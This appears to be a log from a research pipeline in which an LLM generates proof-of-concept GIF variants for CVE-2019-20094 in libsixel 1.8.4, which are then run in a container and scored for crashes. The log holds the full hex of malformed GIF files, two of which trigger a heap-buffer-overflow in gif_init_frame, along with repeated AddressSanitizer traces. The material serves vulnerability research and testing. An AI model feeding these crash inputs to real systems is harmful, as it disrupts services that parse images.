+2026-01-14 13:04:51,191 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P11.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x78339f029e9c at pc 0x00000054eded bp 0x7fffc78dc3e0 sp 0x7fffc78dc3d8
+WRITE of size 1 at 0x78339f029e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x7833f84dbc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x78339f029e9c is located 0 bytes to the right of 58156700-byte region [0x78339b8b3800,0x78339f029e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x7833f84dbc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f06f3dfd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f06f3dfd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x78339f029e9c at pc 0x00000054eded bp 0x7fffc78dc3e0 sp 0x7fffc78dc3d8
+WRITE of size 1 at 0x78339f029e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x7833f84dbc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x78339f029e9c is located 0 bytes to the right of 58156700-byte region [0x78339b8b3800,0x78339f029e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x7833f84dbc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f06f3dfd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f06f3dfd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f06f3dfd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f06f3dfd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [12, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x78339f029e9c at pc 0x00000054eded bp 0x7fffc78dc3e0 sp 0x7fffc78dc3d8\nWRITE of size 1 at 0x78339f029e9c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x7833f84dbc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x78339f029e9c is located 0 bytes to the right of 58156700-byte region [0x78339b8b3800,0x78339f029e9c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x7833f84dbc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0f06f3dfd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f06f3dfd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f06f3dfd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f06f3dfd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f06f3dfd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0f06f3dfd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f06f3dfd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f06f3dfd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f06f3dfd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f06f3dfd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f06f3dfd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 13:05:37,530 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 13:06:21,050 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b
+Written as HEX → binary
+2026-01-14 13:06:21,051 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P12_org.fig
+2026-01-14 13:06:21,052 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P12.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x732defe29e9c at pc 0x00000054eded bp 0x7ffd3c3c3460 sp 0x7ffd3c3c3458
+WRITE of size 1 at 0x732defe29e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x732e491d4c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x732defe29e9c is located 0 bytes to the right of 58156700-byte region [0x732dec6b3800,0x732defe29e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x732e491d4c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0e663dfbd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0e663dfbd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x732defe29e9c at pc 0x00000054eded bp 0x7ffd3c3c3460 sp 0x7ffd3c3c3458
+WRITE of size 1 at 0x732defe29e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x732e491d4c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x732defe29e9c is located 0 bytes to the right of 58156700-byte region [0x732dec6b3800,0x732defe29e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x732e491d4c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0e663dfbd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e663dfbd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0e663dfbd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e663dfbd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [13, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x732defe29e9c at pc 0x00000054eded bp 0x7ffd3c3c3460 sp 0x7ffd3c3c3458\nWRITE of size 1 at 0x732defe29e9c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x732e491d4c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x732defe29e9c is located 0 bytes to the right of 58156700-byte region [0x732dec6b3800,0x732defe29e9c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x732e491d4c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0e663dfbd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e663dfbd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e663dfbd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e663dfbd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e663dfbd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0e663dfbd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e663dfbd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e663dfbd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e663dfbd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e663dfbd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e663dfbd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 13:07:07,341 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 13:07:53,212 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edca871e3c68d1b376edca871e3c68d1b375a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edca871e3c68d1b376edca871e3c68d1b375a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 13:07:53,213 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P13_org.fig
+2026-01-14 13:07:53,214 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P13.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+runtime error
+corrupt GIF (reason: illegal code in raster).
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+runtime error
+corrupt GIF (reason: illegal code in raster).
+
+
+Crash Detected: False
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [14, 'CVE-2019-20094', 'gif_init_frame', False, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edca871e3c68d1b376edca871e3c68d1b375a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n runtime error\ncorrupt GIF (reason: illegal code in raster).\n']
+Updated xlsx
